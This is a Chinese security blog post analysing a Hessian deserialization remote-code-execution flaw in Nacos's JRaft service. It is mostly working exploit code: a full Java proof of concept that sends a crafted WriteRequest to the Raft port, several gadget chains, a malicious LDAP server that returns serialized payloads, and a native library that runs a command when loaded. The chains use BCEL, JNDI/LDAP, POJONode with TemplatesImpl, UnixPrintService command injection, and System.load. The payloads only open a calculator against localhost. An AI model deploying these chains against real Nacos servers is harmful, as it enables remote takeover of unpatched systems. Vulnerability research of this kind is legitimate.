---
title: "Nacos JRaft Hessian 反序列化 RCE 分析"
date: 2023-06-13T08:49:07+08:00
lastmod: 2023-06-30T08:49:07+08:00
draft: false
author: "X1r0z"

tags: ['nacos', 'jraft', 'hessian']
categories: ['Java安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

Nacos JRaft Hessian 反序列化 RCE 分析

<!--more-->

首发于知识星球

[https://t.zsxq.com/0f5hOnVRN](https://t.zsxq.com/0f5hOnVRN)

[https://t.zsxq.com/0fHZ1ruZC](https://t.zsxq.com/0fHZ1ruZC)

参考链接

[https://github.com/alibaba/nacos/releases/tag/2.2.3](https://github.com/alibaba/nacos/releases/tag/2.2.3)

[https://github.com/alibaba/nacos/pull/10542/commits](https://github.com/alibaba/nacos/pull/10542/commits)

[https://www.sofastack.tech/projects/sofa-jraft/jraft-user-guide/](https://www.sofastack.tech/projects/sofa-jraft/jraft-user-guide/)

[https://www.cnblogs.com/kingbridge/articles/16717030.html](https://www.cnblogs.com/kingbridge/articles/16717030.html)

[http://www.bmth666.cn/bmth_blog/2023/02/07/0CTF-TCTF-2022-hessian-onlyJdk](http://www.bmth666.cn/bmth_blog/2023/02/07/0CTF-TCTF-2022-hessian-onlyJdk)

[https://xz.aliyun.com/t/11732](https://xz.aliyun.com/t/11732)

PoC 源码

[https://github.com/X1r0z/Nacos-Hessian-RCE](https://github.com/X1r0z/Nacos-Hessian-RCE)

## 原理分析

[https://y4er.com/posts/nacos-hessian-rce/](https://y4er.com/posts/nacos-hessian-rce/)

写得很清楚了, 这里不多赘述

poc 大致如下

```java
package com.example;

import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alipay.sofa.jraft.CliService;
import com.alipay.sofa.jraft.RaftServiceFactory;
import com.alipay.sofa.jraft.RouteTable;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.google.protobuf.ByteString;
import com.google.protobuf.Message;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.lang.reflect.Field;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class Demo {

    public static void main(String[] args) throws Exception {

        RouteTable rt = RouteTable.getInstance();
        Configuration conf = new Configuration();

        // 目标 nacos Raft Server
        PeerId peerId = new PeerId();
        peerId.parse("127.0.0.1:7848");

        String groupId = "naming_persistent_service_v2";

        conf.addPeer(peerId);

        // 初始化 CliService 和 CliClientService 客户端
        CliService cliService =  RaftServiceFactory.createAndInitCliService(new CliOptions());
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());

        // 刷新路由表
        rt.updateConfiguration(groupId, conf);

        rt.refreshLeader(cliClientService, groupId, 10000).isOk();

        Field parserClassesField = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
        parserClassesField.setAccessible(true);

        ConcurrentHashMap parserClasses = (ConcurrentHashMap) parserClassesField.get(cliClientService.getRpcClient());
        parserClasses.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());

        Field messagesField = MarshallerHelper.class.getDeclaredField("messages");
        messagesField.setAccessible(true);

        Map<String, Message> messages = (Map<String, Message>) messagesField.get(MarshallerHelper.class);
        messages.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());

        // ldap JNDI 注入
        SwingLazyValue swingLazyValue = new SwingLazyValue("javax.naming.InitialContext","doLookup",new String[]{"ldap://127.0.0.1:1389/"});

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", swingLazyValue);
        u2.put("aaa", swingLazyValue);

        HashMap map = HashColl.makeMap(u1, u2);

        byte[] payload = Serialization.hessian2Serialize(map);

        WriteRequest writeRequest = WriteRequest.newBuilder().setGroup(groupId).setData(ByteString.copyFrom(payload)).build();
        cliClientService.getRpcClient().invokeSync(peerId.getEndpoint(), writeRequest, 10000);
    }
}
```

注意 SwingLazyValue 只能调用 rt.jar 里的静态方法 / 构造方法, 但是可以通过 SwingLazyValue + MethodUtil 绕过限制, 从而调用第三方依赖的静态方法

漏洞的后半部分其实跟去年 0ctf/tctf 2022 的 hessian-onlyJdk 类似, 部分利用链也能够使用

最后 Nacos 使用的 sofa-hessian 虽然维护了一份反序列化的黑名单, 但是这并不影响 SwingLazyValue / MethodUtil 去调用某个黑名单类的静态方法

[https://github.com/sofastack/sofa-hessian/blob/master/src/main/resources/security/serialize.blacklist](https://github.com/sofastack/sofa-hessian/blob/master/src/main/resources/security/serialize.blacklist)

## BCEL ClassLoader

一个很经典的思路就是利用 BCEL ClassLoader 加载字节码

```java
JavaClass clazz = Repository.lookupClass(Evil.class);
String payload = "$$BCEL$$" + Utility.encode(clazz.getBytes(), true);

SwingLazyValue swingLazyValue = new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper","_main",new Object[]{new String[]{payload}});

UIDefaults u1 = new UIDefaults();
UIDefaults u2 = new UIDefaults();
u1.put("aaa", swingLazyValue);
u2.put("aaa", swingLazyValue);

HashMap map = HashColl.makeMap(u1, u2);
```

Evil class

```java
public class Evil {
    public static void _main(String[] args){
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (Exception e) {

        }
    }
}
```

但是由于众所周知的原因 BCEL ClassLoader 在 8u251 之后被移除了, 利用面较小

[https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html)

## JNDI LDAP 反序列化 + POJONode 触发 TemplatesImpl

后面研究出的方法, 首先低版本 JDK 可以直接 JNDI 加载字节码 RCE, 而高版本虽然不能直接加载, 但是可以走 LDAP 原生反序列化的流程

因为 Nacos 基于 SpringBoot 开发, 自然也就有 Jackson 依赖, 结合之前 Aliyun CTF 的知识点, 可以利用 POJONode 触发 TemplatesImpl getter 实现 RCE

```java
SwingLazyValue swingLazyValue = new SwingLazyValue("javax.naming.InitialContext","doLookup",new String[]{"ldap://127.0.0.1:1389/"});

UIDefaults u1 = new UIDefaults();
UIDefaults u2 = new UIDefaults();
u1.put("aaa", swingLazyValue);
u2.put("aaa", swingLazyValue);

HashMap map = HashColl.makeMap(u1, u2);
```

原生反序列化部分

```java
TemplatesImpl templatesImpl = new TemplatesImpl();
ClassPool pool = ClassPool.getDefault();
CtClass clazz = pool.get(TemplatesEvilClass.class.getName());

Reflection.setFieldValue(templatesImpl, "_name", "Hello");
Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

POJONode pojoNode = new POJONode(templatesImpl);
BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
Reflection.setFieldValue(poc, "val", pojoNode);

System.out.println(Base64.getEncoder().encodeToString(Serialization.serialize(poc)));
```

LDAP Server

```java
package com.example;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;

public class LDAPServer {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main (String[] args) {

        String url = "http://127.0.0.1:8000/#Calc";
        int port = 1389;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }
        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult (InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {

            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
//             Payload1: 利用 LDAP + Reference Factory
//            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
//            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
//            e.addAttribute("javaCodeBase", cbstring);
//            e.addAttribute("objectClass", "javaNamingReference");
//            e.addAttribute("javaFactory", this.codebase.getRef());
//             Payload2: 返回序列化 Gadget
            System.out.println("Send LDAP Serialized Data");
            try {
                e.addAttribute("javaSerializedData", Base64.decode("<SERIALIZED DATA>"));
            } catch (ParseException exception) {
                exception.printStackTrace();
            }

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

当然这种方式必须得出网, 而 Nacos 更多是在内网中使用的, 可能会不出网 ?

## POJONode 触发 UnixPrintService

参考之前 Dubbo 的 CVE-2022-39198

[https://xz.aliyun.com/t/11961](https://xz.aliyun.com/t/11961)

[https://yml-sec.top/2022/12/30/从cve-2022-39198到春秋杯dubboapp/](https://yml-sec.top/2022/12/30/%E4%BB%8Ecve-2022-39198%E5%88%B0%E6%98%A5%E7%A7%8B%E6%9D%AFdubboapp/)

利用 POJONode 触发 UnixPrintService getter 实现 RCE

通过 MethodUtil 调用 `String#valueOf` 从而间接调用 `POJONode#toString`

```java
Constructor constructor = UnixPrintService.class.getDeclaredConstructor(String.class);
constructor.setAccessible(true);
UnixPrintService unixPrintService = (UnixPrintService) constructor.newInstance(";open -a Calculator");

POJONode pojoNode = new POJONode(unixPrintService);

Method invoke = MethodUtil.class.getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
Method exec = String.class.getDeclaredMethod("valueOf", Object.class);
SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{exec, new String("123"), new Object[]{pojoNode}}});

UIDefaults u1 = new UIDefaults();
UIDefaults u2 = new UIDefaults();
u1.put("aaa", swingLazyValue);
u2.put("aaa", swingLazyValue);

HashMap map = HashColl.makeMap(u1, u2);
```

这种方式的优点就是不出网, 但缺点是只能执行命令, 不能加载字节码

当然也可以 base64 + echo 写一个 Java Agent jar 包然后注入内存马, 或者在目标服务器上起一个 LDAP Server 进行二次利用, 不过比较麻烦

## JavaUtils.writeBytesToFilename + System.load

@Y4er 的文章里提到了 hessian 原生内置的黑名单

![image-20230612121512250](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202306121215736.png)

经过实际测试, 确实会拦截 Runtime 实例

![image-20230612122446347](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202306121224386.png)

但是并没有拦截 SwingLazyValue 调用 `java.lang.System#setProperty`

![image-20230612122521518](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202306121225559.png)

![image-20230612122619607](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202306121226653.png)

后来想通过修改 `com.sun.jndi.ldap.object.trustURLCodebase` 来实现高版本 JNDI 注入直接加载字节码的效果, 但是并没有成功

调试了一会发现 VersionHelper12 中的 trustURLcodebase 属性在 Nacos 启动的时候就已经设置好了, 导致后面即使通过 `System#setProperty` 修改也没有用

![image-20230612123233437](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202306121232477.png)

![image-20230612123501545](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202306121235593.png)

但是毕竟 System 可以直接调用, 所以可以先找一个写文件的 gadget, 然后调用 `System#load` 方法加载系统库文件来实现 RCE

根据参考文章可以找到 `JavaUtils#writeBytesToFilename`, 之后构造 payload 就行了

exp.c

```java
#include <stdlib.h>
#include <stdio.h>

void __attribute__ ((__constructor__))  calc (){
    system("open -a Calculator");
}
```

编译 (MacOS)

```java
gcc -c exp.c -o exp && gcc exp --shared -o exp.dylib
```

payload

```java
byte[] content = Files.readAllBytes(Paths.get("/Users/exp10it/exp.dylib"));
SwingLazyValue swingLazyValue1 = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{"/tmp/exp.dylib", content});
SwingLazyValue swingLazyValue2 = new SwingLazyValue("java.lang.System", "load", new Object[]{"/tmp/exp.dylib"});

UIDefaults u1 = new UIDefaults();
UIDefaults u2 = new UIDefaults();
u1.put("aaa", swingLazyValue1);
u2.put("aaa", swingLazyValue1);

HashMap map1 = HashColl.makeMap(u1, u2);

UIDefaults u3 = new UIDefaults();
UIDefaults u4 = new UIDefaults();
u3.put("bbb", swingLazyValue2);
u4.put("bbb", swingLazyValue2);

HashMap map2 = HashColl.makeMap(u3, u4);

HashMap map = new HashMap();
map.put(1, map1);
map.put(2, map2);
```

## SerializationUtils 二次反序列化 + POJONode 触发 TemplatesImpl

翻了下 ysomap 的代码, 发现了这样一条 bullet

[https://github.com/wh1t3p1g/ysomap/blob/10842ca20aaf7955573616521e305db4de3ef895/core/src/main/java/ysomap/bullets/jdk/ProxyLazyValueWithDSBullet.java](https://github.com/wh1t3p1g/ysomap/blob/10842ca20aaf7955573616521e305db4de3ef895/core/src/main/java/ysomap/bullets/jdk/ProxyLazyValueWithDSBullet.java)

spring-core 中存在 `SerializationUtils#deserialize`, 可以实现**二次反序列化**的效果

![image-20230612194652746](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202306121946809.png)

然后发现 commons-lang 中也存在类似的 SerializationUtils

![image-20230612185641667](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202306121856149.png)

![image-20230612194732238](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202306121947309.png)

经测试这两个方法都能够实现 RCE

```java
TemplatesImpl templatesImpl = new TemplatesImpl();
ClassPool pool = ClassPool.getDefault();
CtClass clazz = pool.get(TemplatesEvilClass.class.getName());

Reflection.setFieldValue(templatesImpl, "_name", "Hello");
Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

POJONode pojoNode = new POJONode(templatesImpl);
BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
Reflection.setFieldValue(poc, "val", pojoNode);

byte[] data = Serialization.serialize(poc);

Method invoke = MethodUtil.class.getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
Method m = SerializationUtils.class.getDeclaredMethod("deserialize", byte[].class);
SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{m, null, new Object[]{data}}});

UIDefaults u1 = new UIDefaults();
UIDefaults u2 = new UIDefaults();
u1.put("aaa", swingLazyValue);
u2.put("aaa", swingLazyValue);

HashMap map = HashColl.makeMap(u1, u2);
```

后来发现如果用 SwingLazyValue + MethodUtils, 有时候 JVM 会直接 crash, 不知道什么情况, 很玄学

于是换成了 ProxyLazyValue, 倒是没有出现 crash

```java
TemplatesImpl templatesImpl = new TemplatesImpl();
ClassPool pool = ClassPool.getDefault();
CtClass clazz = pool.get(TemplatesEvilClass.class.getName());

Reflection.setFieldValue(templatesImpl, "_name", "Hello");
Reflection.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
Reflection.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

POJONode pojoNode = new POJONode(templatesImpl);
BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
Reflection.setFieldValue(poc, "val", pojoNode);

byte[] data = Serialization.serialize(poc);

UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue(SerializationUtils.class.getName(), "deserialize", new Object[]{data});

Field accField = UIDefaults.ProxyLazyValue.class.getDeclaredField("acc");
accField.setAccessible(true);
accField.set(proxyLazyValue, null);

UIDefaults u1 = new UIDefaults();
UIDefaults u2 = new UIDefaults();
u1.put("aaa", proxyLazyValue);
u2.put("aaa", proxyLazyValue);

HashMap map = HashColl.makeMap(u1, u2);
```

不过有时候会出现打不了的情况, 但重启之后反而又能弹计算器, 总之很玄学

## 一种失败的利用思路探索

最初想到的一种利用方式, 但很可惜目前并没有利用成功 (

经过测试发现可以通过一些操作绕过 Nacos 的限制, 强制改变 Raft Group leader, 然后下发 task

```java
package com.example;

import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alipay.sofa.jraft.CliService;
import com.alipay.sofa.jraft.RaftGroupService;
import com.alipay.sofa.jraft.RaftServiceFactory;
import com.alipay.sofa.jraft.RouteTable;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.conf.ConfigurationEntry;
import com.alipay.sofa.jraft.core.NodeImpl;
import com.alipay.sofa.jraft.core.State;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.entity.Task;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.option.NodeOptions;
import com.alipay.sofa.jraft.rpc.CliClientService;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.google.protobuf.ByteString;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.util.Map;

public class Test {

    public static void main(String[] args) throws Exception {

        RouteTable rt = RouteTable.getInstance();
        Configuration conf = new Configuration();

        // 恶意 Raft Server
        PeerId serverId = new PeerId();
        serverId.parse("127.0.0.1:7849");

        // 目标 nacos Raft Server
        PeerId peerId = new PeerId();
        peerId.parse("127.0.0.1:7848");

        String groupId = "naming_instance_metadata";

        // 添加至 Raft Group
        conf.addPeer(serverId);
        conf.addPeer(peerId);

        // 初始化 CliService 和 CliClientService 客户端
        CliService cliService =  RaftServiceFactory.createAndInitCliService(new CliOptions());
        CliClientService cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());

        // 启动恶意 Raft Server
        NodeOptions nodeOptions = new NodeOptions();
        nodeOptions.setLogUri("log-storage");
        nodeOptions.setRaftMetaUri("raftmeta-storage");
        nodeOptions.setElectionTimeoutMs(100000);
        nodeOptions.setFsm(null);
        RaftGroupService cluster = new RaftGroupService(groupId, serverId, nodeOptions);
        NodeImpl node = (NodeImpl) cluster.start();

        // 刷新路由表
        rt.updateConfiguration(groupId, conf);

        if(rt.refreshLeader(cliClientService, groupId, 10000).isOk()){
            // 获取集群当前 leader 节点
            PeerId leader = rt.selectLeader(groupId);
            System.out.println(leader);
        }

        // 修改集群 leader 为恶意 Raft Server 节点
//        Status result = cliService.transferLeader(groupId, conf, serverId);
//        System.out.println(result);

        Field f = NodeImpl.class.getDeclaredField("conf");
        f.setAccessible(true);
        ConfigurationEntry configurationEntry = (ConfigurationEntry) f.get(node);

        configurationEntry.getConf().addPeer(serverId);
        configurationEntry.getConf().addPeer(peerId);

        f = NodeImpl.class.getDeclaredField("state");
        f.setAccessible(true);
        f.set(node, State.STATE_CANDIDATE);

        f = NodeImpl.class.getDeclaredField("currTerm");
        f.setAccessible(true);
        long currTerm = (long) f.get(node);
        f.set(node, currTerm + 1);

        Method m = NodeImpl.class.getDeclaredMethod("becomeLeader");
        m.setAccessible(true);
        m.invoke(node);

        // 获取集群当前 leader 节点
        rt.refreshLeader(cliClientService, groupId, 10000).isOk();
        PeerId leader = rt.selectLeader(groupId);
        System.out.println(leader);

        SwingLazyValue swingLazyValue = new SwingLazyValue("javax.naming.InitialContext","doLookup",new String[]{"ldap://127.0.0.1:1389/"});

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", swingLazyValue);
        u2.put("aaa", swingLazyValue);

        Map map = HashColl.makeMap(u1, u2);

        byte[] payload = Serialization.hessian2Serialize(map);

        WriteRequest writeRequest = WriteRequest.newBuilder().setGroup(groupId).setData(ByteString.copyFrom(payload)).build();

        // apply Task, 调用 setData 设置一个 WriteRequest 实例
        Task task = new Task();
        task.setData(ByteBuffer.wrap(ByteString.copyFrom(writeRequest.toByteArray()).toByteArray()));

        node.apply(task);

    }
}
```

对 Raft 协议不是很熟悉, 最近也没啥时间继续去搞了, poc 暂时就先贴这里吧

## 小记

5-8号折腾的漏洞, 然后9-10号发高烧在床上躺了两天, 不知道是不是巧合 (